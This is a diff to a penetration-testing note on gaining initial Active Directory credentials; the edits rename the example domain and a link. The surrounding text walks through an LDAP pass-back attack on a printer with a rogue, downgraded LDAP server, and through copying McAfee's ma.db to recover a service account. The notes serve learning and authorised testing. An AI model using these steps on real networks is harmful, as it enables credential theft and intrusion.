@@ -1,4 +1,4 @@
-[[Active Directory]] is used for Identity and Access Management, due to this it is a prime target for us. Before we can [[Exploiting Active Directory |exploit]] AD misconfigurations for privilege escalation, [[Lateral Movement and Pivoting|Lateral Movement and Pivoting]], and goal execution, we first need to gain access. We need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant.
+[[Active Directory]] is used for Identity and Access Management, due to this it is a prime target for us. Before we can [[Exploiting AD|exploit]] AD misconfigurations for privilege escalation, [[Lateral Movement and Pivoting|Lateral Movement and Pivoting]], and goal execution, we first need to gain access. We need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant.
 There are many ways to get breach into an AD environment, we could use a [[GoPhish|phishing]] campaign, use credentials find through [[Reconnaissance|OSINT]], or use one of the following methods, between many others.
 
 # NTLM Authenticated Services
@@ -36,9 +36,9 @@ LDAP Pass-back attack can be performed when we gain access to a device's configu
 
 ---
 
-One example could be that we find a printer inside a network with the following address `printer.za.enterprise.com` , we could first try to check any existing directories with something like [[GoBuster]] 
+One example could be that we find a printer inside a network with the following address `printer.www.enterprise.com` , we could first try to check any existing directories with something like [[GoBuster]] 
 ```
-gobuster dir -w common.txt -u http://printer.za.enterprise.com/ -t 64 
+gobuster dir -w common.txt -u http://printer.www.enterprise.com/ -t 64 
 ```
 Here we find a directory `/settings` in which manages the printer LDAP settings. With the following interface
 ![[Pasted image 20241010232617.png]]
@@ -56,7 +56,7 @@ We can start by configuring the LDAP server using the following
 ```sh
 sudo dpkg-reconfigure -p low slapd
 ```
-We say, that we don't want an initial config or database. For our domain name we will use the `za.enterprise.com` part, or whatever the domain of our engagement is, and use the same for organization. Use MDB as our database, don't remove when purged and yes move old database.
+We say, that we don't want an initial config or database. For our domain name we will use the `www.enterprise.com` part, or whatever the domain of our engagement is, and use the same for organization. Use MDB as our database, don't remove when purged and yes move old database.
 Now we have our LDAP server, but first we need to dumb it down. We want to ensure that our LDAP server only supports **PLAIN** and **LOGIN** authentication methods. To do this we need to create a new ldif file, called `olcSaslSecProps.ldif` with the following content
 ```olcSaslSecProps.ldif
 #olcSaslSecProps.ldif
@@ -180,7 +180,7 @@ Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Sea
 We will focus on a centrally deployed application this time. Usually, these applications need a method to authenticate to the domain during both the installation and execution phase. An example of such an application is McAfee Enterprise Endpoint Security, which organizations use as the EDR tool for security.
 It embeds the credentials used during installation to connect back to the orchestrator in a file called `ma.db`. This database file can be retrieved an read with local access to the host to recover the associated AD service account. Once we find it we can copy it to our machine
 ```sh
-scp pwndAdmin@AdminMchn.za.enterprise.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+scp pwndAdmin@AdminMchn.www.enterprise.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
 ```
 To read the database, we will use a tool called `sqlitebrowser`. 
 ```sh
